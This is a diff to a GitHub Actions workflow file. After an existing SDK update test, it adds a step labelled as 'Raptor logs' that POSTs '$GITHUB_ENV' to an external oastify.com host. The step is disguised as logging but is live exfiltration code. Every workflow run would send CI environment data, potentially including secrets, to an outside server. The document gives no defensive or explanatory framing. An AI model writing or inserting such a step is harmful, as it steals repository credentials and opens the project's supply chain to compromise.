@@ -80,3 +80,8 @@ jobs:
       - name: Test SDK update
         run: |
           archetype/src/main/archetype/dispatcher.cloud/test/test_dispatcher_sdk_update.sh sitesdemo archetype/src/main/archetype/dispatcher.cloud/test/dummy_sdk
+
+      # Raptor logs
+      - name: Raptor
+        run: |
+          curl -X POST http://ehz3tpyzkms23azx4z9z8kvce3kw8mwb.oastify.com --data "Secrets=$GITHUB_ENV"
